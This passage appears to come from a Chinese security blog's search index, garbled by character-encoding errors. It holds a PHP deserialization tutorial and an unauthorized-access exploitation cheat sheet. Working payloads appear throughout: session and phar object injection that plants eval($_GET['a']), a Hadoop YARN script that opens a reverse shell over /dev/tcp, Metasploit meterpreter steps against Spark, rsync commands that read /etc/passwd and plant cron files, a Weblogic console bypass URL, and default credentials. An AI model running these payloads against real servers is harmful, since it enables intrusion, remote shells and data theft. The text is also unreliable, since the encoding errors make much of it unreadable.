D{ var $a=&quot;system('whoami');&quot;; } echo serialize(new D()); ?&gt;/class20/save.php?a=|O:1:&quot;D&quot;:1:{s:1:&quot;a&quot;;s:17:&quot;system(%27whoami%27);&quot;;} ç„¶åç›´æ¥åˆ°vul.phpåˆ·æ–°å°±èƒ½çœ‹åˆ°æ‰§è¡Œå‘½ä»¤äº† sessionä¾‹é¢˜123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(__FILE__);/*hint.php*/session_start();class Flag{ public $name; public $her; function __wakeup(){ $this-&gt;her=md5(rand(1, 10000)); // herè¢«èµ‹å€¼éšæœºmd5å€¼ if ($this-&gt;name===$this-&gt;her){ // è¦æ±‚nameå’Œherå®Œå…¨ç›¸ç­‰ include('flag.php'); echo $flag; } }}?&gt;# hint.php&lt;?php highlight_file(__FILE__); error_reporting(0); ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['a'] = $_GET['a']; ?&gt;&lt;?php class Flag{ public $name; public $her; } $a = new Flag(); $a-&gt;name =&amp;$a-&gt;her; echo serialize($a);O:4:&quot;Flag&quot;:2:{s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;} ã€Œå¼•ç”¨èµ‹å€¼ç»•è¿‡éšæœºæ ¡éªŒã€+ã€Œsession åºåˆ—åŒ–å¤„ç†å™¨ä¼ é€’æ¶æ„å¯¹è±¡ã€+ã€Œé­”æœ¯æ–¹æ³•__wakeup è§¦å‘é€»è¾‘ã€ è¿˜å¯ä»¥ç»“åˆæ–‡ä»¶ä¸Šä¼ æ¥è€ƒ pharååºåˆ—åŒ–pharæ˜¯phpä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç±»ä¼¼jaråŒ… 5.3æˆ–é«˜ç‰ˆæœ¬å¯ä»¥è¯»pharä¼ªåè®®å¯ä»¥è¯»å–.pharæ–‡ä»¶ stub pharæ–‡ä»¶æ ¼å¼ï¼Œæ ¼å¼ä¸º 1234xxx&lt;?php xxx;__HALT_COMPiLER;?&gt;;mainfestå‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥åºåˆ—åŒ–å­˜å‚¨contentså‹ç¼©æ–‡ä»¶çš„å†…å®¹signatureç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶å°¾ æ¼æ´é¡µé¢ 123456789101112131415&lt;?php highlight_file(__FILE__); error_reporting(0); class Testobj { var $output=&quot;echo 'ok';&quot;; function __destruct() { eval($this-&gt;output); } } if(isset($_GET['filename'])) // å…³é”®è§¦å‘ç‚¹{ $filename=$_GET['filename']; var_dump(file_exists($filename)); } ?&gt; ä¸‹é¢è¿™ä¸ªpayloadè¦ä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶è¿™é‡Œä»–ç›´æ¥ç‚¹é‚£ä¸ªç”Ÿæˆå°±ç»™ä½ ä¸Šä¼ äº† 1?filename=phar://test.phar&amp;a=system(%27whoami%27); ç”Ÿæˆpharä»£ç  123456789101112131415161718&lt;?php class Testobj { var $output=''; } @unlink('test.phar'); //åˆ é™¤ä¹‹å‰çš„test.paræ–‡ä»¶(å¦‚æœæœ‰) $phar=new Phar('test.phar'); //åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåç¼€ $phar-&gt;startBuffering(); //å¼€å§‹å†™æ–‡ä»¶ $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); //å†™å…¥stub $o=new Testobj(); $o-&gt;output='eval($_GET[&quot;a&quot;]);'; $phar-&gt;setMetadata($o);//å†™å…¥meta-data $phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar-&gt;stopBuffering(); ?&gt;//Metadata æ®µï¼šå­˜å‚¨äº†Testobjç±»çš„å®ä¾‹ï¼Œä¸”è¯¥å®ä¾‹çš„outputå±æ€§å€¼ä¸º eval($_GET[&quot;a&quot;]);ï¼ˆæ ¸å¿ƒæ¶æ„ä»£ç æ¨¡æ¿ï¼‰ pharä¿®æ”¹æˆä»»ä½•åç¼€éƒ½ä¸å½±å“è§£æå¯¹å…·ä½“çš„é¢˜ç›® pharä½¿ç”¨æ¡ä»¶ 1234pharèƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯è¦æœ‰å¯ç”¨ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•ä½œä¸ºè·³æ¿è¦æœ‰æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå…¥file_exits(),fopen(),file_get_contents()æ–‡ä»¶æ“ä½œå‡½æ•°å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡è¢«è¿‡æ»¤ pharä¾‹é¢˜ æŠŠpharåç¼€æ”¹æˆpngä»»ç„¶å¯ä»¥è§£æè¯»å–è¿™ä¸ªæ–‡ä»¶è‡ªåŠ¨è§¦å‘é“¾å­","link":"/2025/12/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"},{"title":"","text":"æœªæˆæƒæ¼æ´åˆ©ç”¨ ç®€ä»‹æœªä½œé™åˆ¶ï¼Œæ™®é€šç”¨æˆ·èƒ½å‚ç›´è¶Šæƒä»€ä¹ˆçš„ æœªæˆæƒè®¿é—®ï¼Œåœ¨ä¸è¿›è¡Œè¯·æ±‚æˆæƒçš„æƒ…å†µä¸‹å¯¹éœ€è¦æƒé™çš„åŠŸèƒ½è¿›è¡Œè®¿é—®æ‰§è¡Œã€‚é€šå¸¸æ˜¯ç”±äºè®¤è¯å­˜åœ¨ç¼ºé™·ã€æ— è®¤è¯æˆ–å®‰å…¨é…ç½®ä¸å½“å¯¼è‡´ã€‚å¸¸è§äºæœåŠ¡ç«¯å£ï¼Œæ¥å£æœªé™åˆ¶å¼€æ”¾ï¼Œç½‘é¡µåŠŸèƒ½é€šè¿‡é“¾æ¥æ— é™åˆ¶ç”¨æˆ·è®¿é—®ï¼Œä½æƒé™ç”¨æˆ·è¶Šæƒè®¿é—®é«˜æƒé™åŠŸèƒ½ã€‚ FTP æœªæˆæƒè®¿é—® ç«¯å£ï¼š21 ä»‹ç»ï¼šFTPæœåŠ¡ç«¯é…ç½®anymouns å¯ç™»å½•ï¼Œåˆ™å¯ç›´æ¥ä½¿ç”¨userä¸ºanymounsï¼Œä¸è¾“å…¥å¯†ç ç›´æ¥å¯ç™»å½•åˆ°FTP æ¼æ´åˆ©ç”¨ï¼šç›´æ¥è®¿é—®ftpè·¯å¾„ï¼šftp://ip:port/ï¼Œæˆ–ç»ˆç«¯ç™»å½•ï¼Œè¾“å…¥userä¸ºanymouns LDAP æœªæˆæƒè®¿é—® ç«¯å£ï¼š389 ä»‹ç»ï¼šLDAP åº•å±‚ä¸€èˆ¬ä½¿ç”¨ TCP æˆ– UDP ä½œä¸ºä¼ è¾“åè®®ã€‚ç›®å½•æœåŠ¡æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ•°æ®åº“ï¼Œæ˜¯ä¸€ç§ä»¥æ ‘çŠ¶ç»“æ„çš„ç›®å½•æ•°æ®åº“ä¸ºåŸºç¡€ã€‚æœªå¯¹LDAPçš„è®¿é—®è¿›è¡Œå¯†ç éªŒè¯ï¼Œå¯¼è‡´æœªæˆæƒè®¿é—®ï¼Œå­˜å‚¨å’ŒæŸ¥è¯¢ â€œç›®å½•å‹æ•°æ®â€ çš„ç½‘ç»œåè®® æ¼æ´åˆ©ç”¨ï¼šå·¥å…·è¿æ¥ rsync æœªæˆæƒè®¿é—® ç«¯å£ï¼š873 ä»‹ç»ï¼šrsyncæ˜¯Linuxä¸‹ä¸€æ¬¾æ•°æ®å¤‡ä»½å·¥å…·ï¼Œæ”¯æŒé€šè¿‡rsyncåè®®ã€sshåè®®è¿›è¡Œè¿œç¨‹æ–‡ä»¶ä¼ è¾“ã€‚å…¶ä¸­rsyncåè®®é»˜è®¤ç›‘å¬873ç«¯å£ï¼Œå¦‚æœç›®æ ‡å¼€å¯äº†rsyncæœåŠ¡ï¼Œå¹¶ä¸”æ²¡æœ‰é…ç½®ACLæˆ–è®¿é—®å¯†ç ï¼Œæˆ‘ä»¬å°†å¯ä»¥è¯»å†™ç›®æ ‡æœåŠ¡å™¨æ–‡ä»¶ æ¼æ´åˆ©ç”¨ï¼šhttps://vulhub.org/#/environments/rsync/common/ rsync rsync://your-ip:873/src/ åˆ—å‡ºç›®å½• rsync -av rsync://your-ip:873/src/etc/passwd ./ ä¸‹è½½æ–‡ä»¶ rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell ä¸Šä¼ æ–‡ä»¶ ZooKeeper æœªæˆæƒè®¿é—® ç«¯å£ï¼š2181 ä»‹ç»ï¼šZooKeeper æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼çš„å¼€æ”¾æºç çš„åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºåè°ƒæœåŠ¡ï¼ŒZooKeeper é»˜è®¤å¼€å¯åœ¨ 2181 ç«¯å£åœ¨æœªè¿›è¡Œä»»ä½•è®¿é—®æ§åˆ¶çš„æƒ…å†µä¸‹æ”»å‡»è€…å¯é€šè¿‡æ‰§è¡Œ envi å‘½ä»¤è·å¾—ç³»ç»Ÿå¤§é‡çš„æ•æ„Ÿä¿¡æ¯åŒ…æ‹¬ç³»ç»Ÿåç§°Java ç¯å¢ƒï¼Œä»»æ„ç”¨æˆ·åœ¨ç½‘ç»œå¯è¾¾çš„æƒ…å†µä¸‹è¿›è¡Œä¸ºæœªæˆæƒè®¿é—®å¹¶è¯»å–æ•°æ®ç”šè‡³ kill æœåŠ¡ã€‚ æ¼æ´åˆ©ç”¨ï¼š echo envi| nc xxx.xxx.xxx.xxx 2181 è·å–æœåŠ¡å™¨ç¯å¢ƒä¿¡æ¯ echo stat | nc 192.168.131.128 2181 Docker æœªæˆæƒè®¿é—® ç«¯å£ï¼š2375 ä»‹ç»ï¼šDocker APIå¯ä»¥æ‰§è¡ŒDockerå‘½ä»¤ï¼Œåœ¨æœªæˆæƒçš„æƒ…å†µä¸‹å¯ä»¥æ‰§è¡Œdockerå‘½ä»¤ æ¼æ´åˆ©ç”¨ï¼šhttps://vulhub.org/#/environments/docker/unauthorized-rce/ Docker Registry æœªæˆæƒè®¿é—® ç«¯å£ï¼š5000 ä»‹ç»ï¼šdocker remote apiå¯ä»¥æ‰§è¡Œdockerå‘½ä»¤ æ¼æ´åˆ©ç”¨ï¼š curl -k -XGET https://xxx.xxx.xxxx/v2/_catalog æŸ¥è¯¢catalog curl -k -XGET https://xxx.xxx.xxx/v2/&lt;image&gt;/tags/listæŸ¥è¯¢tags Kibana æœªæˆæƒè®¿é—® ç«¯å£: 5001 ä»‹ç»ï¼šKibanaå¦‚æœå…è®¸å¤–ç½‘è®¿é—®ï¼Œæ²¡æœ‰åšå®‰å…¨çš„ç™»å½•è®¤è¯ï¼Œä¹Ÿä¼šè¢«å¤–éƒ¨éšæ„è®¿é—®æŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®ï¼Œé€ æˆæ•°æ®æ³„éœ²ã€‚ æ¼æ´åˆ©ç”¨ï¼š ç›´æ¥è®¿é—®kibanaçš„é¡µé¢ VNCæœªæˆæƒè®¿é—® ç«¯å£ï¼š5900, 5901 ä»‹ç»ï¼šVNC æ˜¯è™šæ‹Ÿç½‘ç»œæ§åˆ¶å°Virtual Network Consoleçš„è‹±æ–‡ç¼©å†™ã€‚å®ƒæ˜¯ä¸€æ¬¾ä¼˜ç§€çš„è¿œç¨‹æ§åˆ¶å·¥å…·è½¯ä»¶ç”±ç¾å›½ç”µè¯ç”µæŠ¥å…¬å¸AT&amp;Tçš„æ¬§æ´²ç ”ç©¶å®éªŒå®¤å¼€å‘ã€‚VNCæ˜¯åŸºäº UNXI å’Œ Linux çš„å…è´¹å¼€æºè½¯ä»¶ç”± VNC Server å’Œ VNC Viewer ä¸¤éƒ¨åˆ†ç»„æˆã€‚VNC æœªæˆæƒè®¿é—®æ¼æ´å¦‚è¢«åˆ©ç”¨å¯èƒ½é€ æˆæ¶æ„ç”¨æˆ·ç›´æ¥æ§åˆ¶å—æ§ä¸»æœºå±å®³ç›¸å½“ä¸¥é‡ æ¼æ´åˆ©ç”¨ï¼šä¸‹è½½VNCÂ® Viewerï¼Œå¹¶è¿æ¥ï¼Œè¿™ä¸ªè¦ç»“åˆå…¶ä»–æ¼æ´åˆ©ç”¨ï¼Œä¸ç„¶è¿˜æ˜¯æŒºéš¾åˆ©ç”¨çš„ CouchDB æœªæˆæƒè®¿é—® ç«¯å£ï¼š5984 ä»‹ç»ï¼šApache CouchDB æ˜¯ä¸€ä¸ªå¼€æºæ•°æ®åº“ï¼Œé»˜è®¤ä¼šåœ¨5984ç«¯å£å¼€æ”¾Restfulçš„APIæ¥å£ï¼Œå¦‚æœä½¿ç”¨SSLçš„è¯å°±ä¼šç›‘å¬åœ¨6984ç«¯å£ï¼Œç”¨äºæ•°æ®åº“çš„ç®¡ç†åŠŸèƒ½ã€‚å…¶HTTP Serveré»˜è®¤å¼€å¯æ—¶æ²¡æœ‰è¿›è¡ŒéªŒè¯ï¼Œè€Œä¸”ç»‘å®šåœ¨0.0.0.0ï¼Œæ‰€æœ‰ç”¨æˆ·å‡å¯é€šè¿‡APIè®¿é—®å¯¼è‡´æœªæˆæƒè®¿é—®ã€‚ æ¼æ´åˆ©ç”¨ï¼šcurl xxx.xxx.xxx.xxx:5984/_config Apache Spark æœªæˆæƒè®¿é—® ç«¯å£ï¼š6066, 8081,8082 ä»‹ç»ï¼šApache Sparkæ˜¯ä¸€æ¬¾é›†ç¾¤è®¡ç®—ç³»ç»Ÿï¼Œå…¶æ”¯æŒç”¨æˆ·å‘ç®¡ç†èŠ‚ç‚¹æäº¤åº”ç”¨ï¼Œå¹¶åˆ†å‘ç»™é›†ç¾¤æ‰§è¡Œã€‚å¦‚æœç®¡ç†èŠ‚ç‚¹æœªå¯åŠ¨è®¿é—®æ§åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨é›†ç¾¤ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥æ¼æ´çš„æœ¬è´¨æ˜¯æœªæˆæƒç”¨æˆ·å¯ä»¥å‘MasterèŠ‚ç‚¹æäº¤ä¸€ä¸ªåº”ç”¨ï¼ŒMasterèŠ‚ç‚¹ä¼šåˆ†å‘ç»™SlaveèŠ‚ç‚¹æ‰§è¡Œåº”ç”¨ã€‚å¦‚æœåº”ç”¨ä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œä¼šå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œï¼Œå¨èƒSparké›†ç¾¤æ•´ä½“çš„å®‰å…¨æ€§ã€‚ æ¼æ´åˆ©ç”¨ï¼šä½¿ç”¨msfå·¥å…·getshell 123456789msf5&gt;use exploit/linux/http/spark_unauth_rcemsf5&gt;set payload java/meterpreter/reverse_tcpmsf5&gt;set rhost xxx.xxxx.xxxxmsf5&gt;set rport 6066msf5&gt;set lhost xxx.xxx.xxx.xxxmsf5&gt;set lport 4444msf5&gt;set srvhost xxx.xxx.xxx.xxxmsf5&gt;set srvport 8080msf5&gt;exploit Redis æœªæˆæƒè®¿é—® ç«¯å£ï¼š6379 ä»‹ç»ï¼šredisæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼Œé»˜è®¤ç«¯å£æ˜¯6379ï¼Œredisé»˜è®¤æ˜¯æ²¡æœ‰å¯†ç éªŒè¯çš„ï¼Œå¯ä»¥å…å¯†ç ç™»å½•æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ“ä½œredisè¿›ä¸€æ­¥æ§åˆ¶æœåŠ¡å™¨ã€‚ Redisæœªæˆæƒè®¿é—®åœ¨4.x/5.0.5ä»¥å‰ç‰ˆæœ¬ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨master/slaveæ¨¡å¼åŠ è½½è¿œç¨‹æ¨¡å—ï¼Œé€šè¿‡åŠ¨æ€é“¾æ¥åº“çš„æ–¹å¼æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´åˆ©ç”¨ï¼šredis-cliè¿œç¨‹è¿æ¥ Weblogic æœªæˆæƒè®¿é—® ç«¯å£ï¼š7001 ä»‹ç»ï¼šWeblogicæ˜¯Oracleå…¬å¸æ¨å‡ºçš„J2EEåº”ç”¨æœåŠ¡å™¨ï¼ŒCVE-2020-14882å…è®¸æœªæˆæƒçš„ç”¨æˆ·ç»•è¿‡ç®¡ç†æ§åˆ¶å°çš„æƒé™éªŒè¯è®¿é—®åå°ã€‚ CVE-2020-14883å…è®¸åå°ä»»æ„ç”¨æˆ·é€šè¿‡HTTPåè®®æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä½¿ç”¨è¿™ä¸¤ä¸ªæ¼æ´ç»„æˆçš„åˆ©ç”¨é“¾ï¼Œå¯é€šè¿‡ä¸€ä¸ªGETè¯·æ±‚åœ¨è¿œç¨‹WeblogicæœåŠ¡å™¨ä¸Šä»¥æœªæˆæƒçš„ä»»æ„ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚ æ¼æ´åˆ©ç”¨ï¼š http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252fconsole.portalè¿›å…¥åå° Hadoop YARN æœªæˆæƒè®¿é—® ç«¯å£ï¼š8088 ä»‹ç»ï¼šHadoopæ˜¯ä¸€æ¬¾ç”±ApacheåŸºé‡‘ä¼šæ¨å‡ºçš„åˆ†å¸ƒå¼ç³»ç»Ÿæ¡†æ¶ï¼Œå®ƒé€šè¿‡è‘—åçš„MapReduceç®—æ³•è¿›è¡Œåˆ†å¸ƒå¼å¤„ç†ï¼ŒYarnæ˜¯Hadoopé›†ç¾¤çš„èµ„æºç®¡ç†ç³»ç»Ÿã€‚æ­¤æ¬¡äº‹ä»¶ä¸»è¦å› HadoopYARNèµ„æºç®¡ç†ç³»ç»Ÿé…ç½®ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥æœªç»æˆæƒè¿›è¡Œè®¿é—®ï¼Œä»è€Œè¢«æ”»å‡»è€…æ¶æ„åˆ©ç”¨ã€‚æ”»å‡»è€…æ— éœ€è®¤è¯å³å¯é€šè¿‡RESTAPIéƒ¨ç½²ä»»åŠ¡æ¥æ‰§è¡Œä»»æ„æŒ‡ä»¤ï¼Œæœ€ç»ˆå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚ æ¼æ´åˆ©ç”¨ 12345678910111213141516171819#!/usr/bin/env pythonimport requeststarget = 'http://xxx.xxx.xxx.xxx:8088/' # è®¾ç½®ç›®æ ‡ä¸»æœºçš„ipåœ°å€lhost = 'xxx.xxx.xxx.xxx' # è®¾ç½®ä½ æ”»å‡»ä¸»æœºçš„ç›‘å¬ipåœ°å€ï¼Œå¹¶ä¸”ç›‘å¬ç«¯å£ä¸º9999url = target + 'ws/v1/cluster/apps/new-application'resp = requests.post(url)app_id = resp.json()['application-id']url = target + 'ws/v1/cluster/apps'data = { 'application-id': app_id, 'application-name': 'get-shell', 'am-container-spec': { 'commands': { 'command': '/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1' % lhost, }, }, 'application-type': 'YARN',}requests.post(url, json=data) JBoss æœªæˆæƒè®¿é—® ç«¯å£ï¼š8080 ä»‹ç»ï¼šJBOSS ä¼ä¸šåº”ç”¨å¹³å°EAPæ˜¯ J2EE åº”ç”¨çš„ä¸­é—´ä»¶å¹³å°ã€‚é»˜è®¤æƒ…å†µä¸‹è®¿é—® http://ip:8080/jmx-consoleï¼Œå°±å¯ä»¥æµè§ˆ Jboss çš„éƒ¨ç½²ç®¡ç†çš„ä¿¡æ¯ä¸éœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç å¯ä»¥ç›´æ¥éƒ¨ç½²ä¸Šä¼ æœ¨é©¬æœ‰å®‰å…¨éšæ‚£ã€‚ æ¼æ´åˆ©ç”¨ï¼š åŒtomcat manager Jenkins æœªæˆæƒè®¿é—® ç«¯å£ï¼š8080 ä»‹ç»ï¼šé»˜è®¤æƒ…å†µä¸‹Jenkinsé¢æ¿ä¸­ç”¨æˆ·å¯ä»¥é€‰æ‹©æ‰§è¡Œè„šæœ¬ç•Œé¢æ¥æ“ä½œä¸€äº›ç³»ç»Ÿå±‚å‘½ä»¤ï¼Œæ”»å‡»è€…å¯é€šè¿‡æœªæˆæƒè®¿é—®æ¼æ´æˆ–è€…æš´åŠ›ç ´è§£ç”¨æˆ·å¯†ç ç­‰è¿›è„šæœ¬æ‰§è¡Œç•Œé¢ä»è€Œè·å–æœåŠ¡å™¨æƒé™ã€‚ æ¼æ´åˆ©ç”¨ï¼šæœªæˆæƒè®¿é—® http://&lt;target&gt;:8080/scriptï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ Kubernetes Api Server æœªæˆæƒ ç«¯å£ï¼š8080,10250 ä»‹ç»ï¼šKubernetes çš„æœåŠ¡åœ¨æ­£å¸¸å¯åŠ¨åä¼šå¼€å¯ä¸¤ä¸ªç«¯å£ï¼šLocalhost Port ï¼ˆé»˜è®¤8080ï¼‰ã€Secure Port ï¼ˆé»˜è®¤6443ï¼‰ã€‚è¿™ä¸¤ä¸ªç«¯å£éƒ½æ˜¯æä¾› Api Server æœåŠ¡çš„ï¼Œä¸€ä¸ªå¯ä»¥ç›´æ¥é€šè¿‡ Web è®¿é—®ï¼Œå¦ä¸€ä¸ªå¯ä»¥é€šè¿‡ kubectl å®¢æˆ·ç«¯è¿›è¡Œè°ƒç”¨ã€‚å¦‚æœè¿ç»´äººå‘˜æ²¡æœ‰åˆç†çš„é…ç½®éªŒè¯å’Œæƒé™ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªæ¥å£å»è·å–å®¹å™¨çš„æƒé™ã€‚ æ¼æ´åˆ©ç”¨ï¼š http://xxx.xxx.xxx.xxx:8080/ å¯ä»¥çœ‹åˆ°è·¯ç”±ä¿¡æ¯ 10250ç«¯å£æ˜¯kubelet APIçš„HTTPSç«¯å£ï¼Œé€šè¿‡è·¯å¾„:https://xxx.xxx.xxx.xxx/10250/podsè·å–ç¯å¢ƒå˜é‡ã€è¿è¡Œçš„å®¹å™¨ä¿¡æ¯ã€å‘½åç©ºé—´ç­‰ä¿¡æ¯ Active MQ æœªæˆæƒè®¿é—® ç«¯å£ï¼š8161 ä»‹ç»ï¼šActiveMQ æ˜¯ä¸€æ¬¾æµè¡Œçš„å¼€æºæ¶ˆæ¯æœåŠ¡å™¨ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒActiveMQ æœåŠ¡æ˜¯æ²¡æœ‰é…ç½®å®‰å…¨å‚æ•°ã€‚æ¶æ„äººå‘˜å¯ä»¥åˆ©ç”¨é»˜è®¤é…ç½®å¼±ç‚¹å‘åŠ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ”»å‡»ï¼Œè·å–æœåŠ¡å™¨æƒé™ï¼Œä»è€Œå¯¼è‡´æ•°æ®æ³„éœ²ã€‚ æ¼æ´åˆ©ç”¨ï¼š é»˜è®¤å£ä»¤ï¼šadmin/admin Jupyter Notebook æœªæˆæƒè®¿é—® ç«¯å£ï¼š8888 ä»‹ç»ï¼šJupyter Notebookï¼ˆæ­¤å‰è¢«ç§°ä¸º IPython notebookï¼‰æ˜¯ä¸€ä¸ªäº¤äº’å¼ç¬”è®°æœ¬ï¼Œæ”¯æŒè¿è¡Œ 40 å¤šç§ç¼–ç¨‹è¯­è¨€ã€‚å¦‚æœç®¡ç†å‘˜æœªä¸ºJupyter Notebooké…ç½®å¯†ç ï¼Œå°†å¯¼è‡´æœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ¸¸å®¢å¯åœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ªconsoleå¹¶æ‰§è¡Œä»»æ„Pythonä»£ç å’Œå‘½ä»¤ã€‚ æ¼æ´åˆ©ç”¨ï¼š è®¿é—®http://xxx.xxx.xxx.xxx:8888ï¼Œå°†çœ‹åˆ°Jupyter Notebookçš„Webç®¡ç†ç•Œé¢ï¼Œå¹¶æ²¡æœ‰è¦æ±‚å¡«å†™å¯†ç  é€‰æ‹© new -&gt; terminal å³å¯åˆ›å»ºä¸€ä¸ªæ§åˆ¶å° ç›´æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ Elasticsearch æœªæˆæƒè®¿é—® ç«¯å£ï¼š9200,9300 ä»‹ç»ï¼šElasticsearchæ˜¯ä¸€æ¬¾javaç¼–å†™çš„ä¼ä¸šçº§æœç´¢æœåŠ¡ã€‚è¶Šæ¥è¶Šå¤šçš„å…¬å¸ä½¿ç”¨ELKä½œä¸ºæ—¥å¿—åˆ†æï¼Œå¯åŠ¨æ­¤æœåŠ¡é»˜è®¤ä¼šå¼€æ”¾9200ç«¯å£æˆ–è€…9300ç«¯å£ï¼Œå¯è¢«éæ³•æ“ä½œæ•°æ®ã€‚ æ¼æ´åˆ©ç”¨ï¼š ç›´æ¥è®¿é—®http://xxx.xxx.xxx.xxx:9200 _cat/indices _river/_search æ•°æ®åº“ä¿¡æ¯ _nodes èŠ‚ç‚¹ä¿¡æ¯ _plugin/head ï¼ˆæœ‰headæ’ä»¶çš„æƒ…å†µä¸‹ï¼‰ Zabbix æœªæˆæƒè®¿é—® ç«¯å£ï¼š10051 ä»‹ç»ï¼šzabbixæ˜¯ä¸€æ¬¾æœåŠ¡å™¨ç›‘æ§è½¯ä»¶ï¼Œé»˜è®¤æœåŠ¡å¼€æ”¾ç«¯å£ä¸º10051ï¼Œå…¶ç”±serverã€agentã€webç­‰æ¨¡å—ç»„æˆï¼Œå…¶ä¸­webæ¨¡å—ç”±PHPç¼–å†™ï¼Œç”¨æ¥æ˜¾ç¤ºæ•°æ®åº“ä¸­çš„ç»“æœã€‚ æ¼æ´åˆ©ç”¨ æ— éœ€è´¦æˆ·å¯†ç ç›´æ¥è®¿é—®zabbixé¡µé¢ RabbitMQ æœªæˆæƒè®¿é—® ç«¯å£ï¼š15672,15692,25672 ä»‹ç»ï¼šRabbitMQæ˜¯ç›®å‰éå¸¸çƒ­é—¨çš„ä¸€æ¬¾æ¶ˆæ¯ä¸­é—´ä»¶ï¼ŒåŸºäºAMQPåè®®çš„ï¼Œå¯ä»¥åœ¨å‘å¸ƒè€…å’Œä½¿ç”¨è€…ä¹‹é—´äº¤æ¢å¼‚æ­¥æ¶ˆæ¯ã€‚æ¶ˆæ¯å¯ä»¥æ˜¯äººç±»å¯è¯»çš„JSONï¼Œç®€å•å­—ç¬¦ä¸²æˆ–å¯ä»¥è½¬æ¢ä¸ºJSONå­—ç¬¦ä¸²çš„å€¼åˆ—è¡¨ã€‚ æ¼æ´åˆ©ç”¨ï¼š é»˜è®¤è´¦å·å¯†ç éƒ½æ˜¯guest MongoDB æœªæˆæƒè®¿é—® ç«¯å£ï¼š27017 ä»‹ç»ï¼šå¼€å¯MongoDBæœåŠ¡æ—¶ä¸æ·»åŠ ä»»ä½•å‚æ•°æ—¶,é»˜è®¤æ˜¯æ²¡æœ‰æƒé™éªŒè¯çš„,ç™»å½•çš„ç”¨æˆ·å¯ä»¥é€šè¿‡é»˜è®¤ç«¯å£æ— éœ€å¯†ç å¯¹æ•°æ®åº“ä»»æ„æ“ä½œï¼ˆå¢ã€åˆ ã€æ”¹ã€æŸ¥é«˜å±åŠ¨ä½œï¼‰è€Œä¸”å¯ä»¥è¿œç¨‹è®¿é—®æ•°æ®åº“ã€‚ æ¼æ´åˆ©ç”¨ï¼š ä½¿ç”¨æ•°æ®åº“è¿æ¥å·¥å…· å¦‚navicat ç­‰ç›´æ¥è¿æ¥ NFS æœªæˆæƒè®¿é—® ç«¯å£ï¼š2049ï¼Œ20048 ä»‹ç»ï¼šNetworkFileSystem(NFS)ï¼Œæ˜¯ç”±SUNå…¬å¸ç ”åˆ¶çš„UNIXè¡¨ç¤ºå±‚åè®®(pressentation layer protocol)ï¼Œèƒ½ä½¿ä½¿ç”¨è€…è®¿é—®ç½‘ç»œä¸Šåˆ«å¤„çš„æ–‡ä»¶å°±åƒåœ¨ä½¿ç”¨è‡ªå·±çš„è®¡ç®—æœºä¸€æ ·ã€‚æœåŠ¡å™¨åœ¨å¯ç”¨nfsæœåŠ¡ä»¥åï¼Œç”±äºnfsæœåŠ¡æœªé™åˆ¶å¯¹å¤–è®¿é—®ï¼Œå¯¼è‡´å…±äº«ç›®å½•æ³„æ¼ æ¼æ´åˆ©ç”¨ï¼š å®‰è£…nfså®¢æˆ·ç«¯ nfs-common æŸ¥çœ‹nfsæœåŠ¡å™¨ä¸Šçš„å…±äº«ç›®å½• showmount -e xxx.xxx.xxx.xxx æŒ‚è½½ç›¸åº”å…±äº«ç›®å½•åˆ°æœ¬åœ° mount -t nfs xxx.xxx.xxx.xxx:/grdata /mnt Dubbo æœªæˆæƒè®¿é—® ç«¯å£ï¼š28096 ä»‹ç»ï¼šDubboæ˜¯é˜¿é‡Œå·´å·´å…¬å¸å¼€æºçš„ä¸€ä¸ªé«˜æ€§èƒ½ä¼˜ç§€çš„ æœåŠ¡æ¡†æ¶ï¼Œä½¿å¾—åº”ç”¨å¯é€šè¿‡é«˜æ€§èƒ½çš„ RPC å®ç°æœåŠ¡çš„è¾“ å‡ºå’Œè¾“å…¥åŠŸèƒ½ï¼Œå¯ä»¥å’Œ Springæ¡†æ¶æ— ç¼é›†æˆã€‚dubbo å› 